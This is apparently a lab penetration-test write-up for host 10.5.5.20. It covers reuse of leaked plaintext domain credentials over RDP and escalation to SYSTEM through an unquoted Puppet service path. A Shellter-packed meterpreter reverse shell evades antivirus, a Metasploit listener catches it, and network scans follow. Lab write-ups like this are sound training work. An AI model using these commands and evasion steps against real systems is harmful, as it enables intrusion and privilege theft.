# Poultry (10.5.5.20)
***
## Exploitation
> [!info] 
>  While exploring SMB share (on Zora), a powershell script named `system_report.ps1` was found inside `/mnt/Scripts` containing credentials of a domain user named `alex`. 

``` 
username = "sandbox\alex"
password = "Ndawc*nRoqkC+haZ"
```

1. From our previous exploits (**Zora**), we already know that `10.5.5.20` has a running **Remote Desktop Protocol (RDP)**. And since we have one of the user's credential, we established a connection to  `10.5.5.20` using the command
   
```
proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard /tls-seclevel:0 /timeout:80000
```

![[poultry-rdp.png]]

***
## Post-exploitation

1. We started checking for non-standard services. One of the first things that stands out to us is the `Puppet Agent` has a service path that is not quoted. After further checking, we confirmed that the service is configured to run via `Local System` which could potentially give us an elevated permissions.
   
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
```

![[poultry-services.png]]

> [!note] 
> We noticed that McAfee  Anti-virus is also running.

2. In order to leverage the unquoted path `C:\Puppet\Current Version`, we created a reverse shell named `Current.exe`  and place it in `C:\Puppet`.

> [!important] 
> Since the target has an anti-virus installed, we also have to make sure that  our reverse shell won't get flagged or detected. We used [Shellter](https://www.shellterproject.com/download/) to achieve this.
> 
> We used a regular Windows executable (in this case the `whoami.exe`) and injected our meterpreter payload using [Shellter](https://www.shellterproject.com/download/). We then renamed it to `Current.exe`.

3. We then started our meterpreter listener
```
sudo msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost KALI_IP; set lport 80; exploit"
```

4. After restarting (`shutdown /r -t 5`) the machine, we were able to get a connection on our meterpreter running in the context of `NT AUTHORITY\SYSTEM`
![[poultry-system.png]]

5. We ran ping sweep and discovered 2 other connected hosts: `10.5.5.25` and `10.5.5.30`
   
   ![[poultry-pingsweep.png]]
6. We ran an nmap scan on 2 newly discovered hosts.

```
proxychains nmap --top-ports=1000 -sT -Pn 10.5.5.25,30 --open
...
...
...
Nmap scan report for 10.5.5.30
Host is up (0.80s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap scan report for 10.5.5.25
Host is up (0.80s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

We noticed the open port **53**  on `10.5.5.30` which suggests that it could be a domain controller. Port **8080** on `10.5.5.25` is also interesting.